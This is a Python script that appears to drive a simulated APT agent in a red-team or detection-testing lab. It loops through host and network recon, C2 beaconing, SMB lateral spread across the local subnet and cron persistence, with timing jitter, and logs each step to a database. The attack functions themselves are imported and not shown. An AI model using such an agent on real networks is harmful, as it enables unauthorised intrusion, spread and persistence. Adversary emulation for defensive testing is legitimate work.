#!/usr/bin/env python3
"""
Red Brain (Recon-Centric APT)
Prioritizes Intelligence Gathering (Survey/Sniff) over noise.
"""

import time
import random
import logging
from threat_intel import ThreatIntel
from red_tools import (
    TrafficGenerator, DGA, PersistenceManager, LateralMover,
    PrivEsc, ExfiltrationEngine, SystemSurveyor, NetworkSniffer
)
from db_manager import DatabaseManager
import config

logging.basicConfig(level=logging.INFO, format='%(asctime)s - [RED RECON] - %(message)s')

class RedAPT:
    def __init__(self):
        self.db = DatabaseManager()
        self.ti = ThreatIntel()

        # Recon Tools
        self.surveyor = SystemSurveyor()
        self.sniffer = NetworkSniffer()

        # Offensive Tools
        self.traffic = TrafficGenerator()
        self.dga = DGA()
        self.persist = PersistenceManager()
        self.lateral = LateralMover()
        self.privesc = PrivEsc()
        self.exfil = ExfiltrationEngine()

        self.running = True
        self.intel_cache = {}

    def run(self):
        logging.info("Red APT Initialized. Phase: DEEP RECONNAISSANCE.")

        while self.running:
            try:
                # 70% Chance of Recon Actions
                if random.random() < 0.7:
                    if random.random() < 0.5:
                        logging.info("Conducting System Survey...")
                        info = self.surveyor.collect_system_info()
                        self.intel_cache['sys'] = info
                        self.db.log_event("RED", "RECON_SYS", f"Host: {info['hostname']}")
                    else:
                        logging.info("Sniffing Network Services...")
                        services = self.sniffer.scan_active_services()
                        if services:
                            logging.info(f"Discovered Services: {services}")
                            self.db.log_event("RED", "RECON_NET", str(services))

                # 30% Chance of Active Ops (Beacon, Lateral, PrivEsc)
                else:
                    action = random.choice(['beacon', 'lateral', 'persist'])

                    if action == 'beacon':
                        target_ip = self.ti.get_c2_ip()
                        if target_ip:
                            self.traffic.send_http_beacon(target_ip)
                            self.db.log_event("RED", "BEACON", target_ip)

                    elif action == 'lateral':
                        neighbors = self.lateral.scan_local_subnet()
                        if neighbors:
                            target = random.choice(neighbors)
                            self.lateral.attempt_smb_spread(target[0])

                    elif action == 'persist':
                        self.persist.install_cron()

                # Low & Slow Jitter (5-15s)
                time.sleep(random.uniform(5.0, 15.0))

            except KeyboardInterrupt:
                self.running = False
            except Exception as e:
                logging.error(f"Error: {e}")
                time.sleep(1)

if __name__ == "__main__":
    apt = RedAPT()
    apt.run()
